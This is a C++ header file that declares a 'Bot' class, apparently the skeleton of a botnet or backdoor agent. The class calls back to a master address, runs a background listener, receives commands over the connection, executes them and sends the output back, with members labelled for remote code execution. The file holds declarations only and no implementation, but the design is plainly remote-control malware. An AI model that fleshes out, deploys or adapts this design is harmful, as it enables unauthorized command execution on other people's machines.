#include <netinet/in.h>
#include <thread>
#pragma once

class Bot {
  public:
    Bot(const sockaddr_in *cbaddr);
    ~Bot();
    int callback(); // Calls back to m_callback_addr

    int start_listener(); // Starts the listener (Creates and backgrounds the listener)
    int stop_listener();  // Stops the listener thread and closes listener fd
    void rce_loop();      // Starts on connection

  private:
    sockaddr_in m_callback_addr;   // Callback/Master Address
    int m_listener_port;           // The Port for the Listener
    int m_listener;                // Listener Fd
    std::thread m_listener_thread; // The background thread for the listener
    bool m_running;                // Is the thread running
    int m_rce;                     // Remote Code Executor Fd

    int background_listener(); // Creates a background thread for the listener to run on
    int create_listener();     // Creates the listener fd
    bool is_listening();       // Checks if the listener fd is present
    bool is_running();         // Checks if the thread is running
    void accept_loop();        // Runs in the thread and accepts connections (sets m_rce)

    bool is_connected();                          // Checks if a connection is active
    std::string get_command();                    // Gets command from connection
    std::string execute_command(std::string cmd); // Executes command
    int send_output(std::string output);          // Sends command output back through connection
};